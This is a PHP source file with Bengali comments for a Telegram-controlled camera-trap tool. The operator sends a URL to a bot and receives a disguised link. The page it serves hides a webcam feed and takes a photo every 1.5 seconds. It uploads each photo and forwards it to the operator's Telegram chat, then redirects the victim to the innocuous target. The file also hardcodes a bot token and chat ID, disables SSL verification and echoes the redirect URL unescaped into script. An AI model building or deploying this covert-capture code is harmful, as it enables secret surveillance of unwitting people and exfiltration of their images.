<?php
$dataFile = 'links.json';
$botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
$chatId = "5896019931";
$siteDomain = "https://camera-y1vl.onrender.com/"; // তোর Render-এর লাইভ লিংক

// লিংক ডেটা লোড বা সেভ করার ফাংশন
function getLinks() {
    global $dataFile;
    if (file_exists($dataFile)) {
        return json_decode(file_get_contents($dataFile), true) ?: [];
    }
    return [];
}

function saveLinks($links) {
    global $dataFile;
    file_put_contents($dataFile, json_encode($links, JSON_PRETTY_PRINT));
}

// ১. টেলিগ্রাম থেকে আসা Webhook রিকোয়েস্ট হ্যান্ডেল করা
$content = file_get_contents("php://input");
if (!empty($content)) {
    $update = json_decode($content, true);
    if (isset($update['message'])) {
        $message = $update['message'];
        $text = trim($message['text'] ?? '');
        $senderChatId = $message['chat']['id'];

        if ($senderChatId == $chatId) {
            // যদি ইউজার কোনো লিংক পাঠায় (যেমন ইউটিউব লিংক)
            if (filter_var($text, FILTER_VALIDATE_URL)) {
                $links = getLinks();
                $slug = substr(md5(uniqid()), 0, 6); // ৬ অক্ষরের ইউনিক আইডি তৈরি
                
                $links[$slug] = $text;
                saveLinks($links);

                $customLink = $siteDomain . "?r=" . $slug;
                
                // বটে লিংক রিটার্ন পাঠানো
                $replyText = "তোর জেনারেট করা লিংক:\n" . $customLink;
                $replyUrl = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text=" . urlencode($replyText);
                file_get_contents($replyUrl);
            } else {
                $replyUrl = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text=" . urlencode("দয়া করে একটি সঠিক URL (যেমন YouTube লিংক) পাঠাস!");
                file_get_contents($replyUrl);
            }
        }
    }
    exit;
}

// ২. ফ্রন্টএন্ড থেকে আসা ছবি পোস্ট রিকোয়েস্ট প্রসেস করা
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
    $uploadDir = 'uploads/';
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0777, true);
    }

    $imgData = $_POST['image'];
    $imgData = str_replace('data:image/png;base64,', '', $imgData);
    $imgData = str_replace(' ', '+', $imgData);
    $data = base64_decode($imgData);

    $fileName = 'img_' . uniqid() . '.png';
    $filePath = $uploadDir . $fileName;

    if (file_put_contents($filePath, $data)) {
        $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendPhoto";
        $postFields = [
            'chat_id' => $chatId,
            'caption' => "Captured: " . $fileName,
            'photo'   => new CURLFile(realpath($filePath))
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegramUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 2); 

        curl_exec($ch);
        curl_close($ch);
    }
    exit;
}

// ৩. ইউজার কোন লিংকে রিডাইরেক্ট হবে তা নির্ধারণ করা (?r=slug)
$redirectUrl = "https://www.aapunkagames.com/"; // ডিফল্ট লিংক
if (isset($_GET['r'])) {
    $slug = $_GET['r'];
    $links = getLinks();
    if (isset($links[$slug])) {
        $redirectUrl = $links[$slug];
    }
}
?>
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #ffffff; /* রিডাইরেক্ট হওয়ার আগে পেজ সাদা দেখাবে */
            overflow: hidden;
        }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const targetUrl = "<?php echo $redirectUrl; ?>";

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                
                // ১ সেকেন্ড পর থেকে ১.৫ সেকেন্ড পরপর ছবি ক্যাপচার ও সেন্ড হবে
                setTimeout(() => {
                    setInterval(captureAndUpload, 1500);
                }, 1000);

                // ৩ সেকেন্ড পর নির্দিষ্ট ইউটিউব বা টার্গেট লিংকে রিডাইরেক্ট করে দেবে
                setTimeout(() => {
                    window.location.href = targetUrl;
                }, 3000);

            })
            .catch(err => {
                console.error("Camera error: ", err);
                window.location.href = targetUrl;
            });

        function captureAndUpload() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/png');

            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'image=' + encodeURIComponent(imageData)
            }).catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
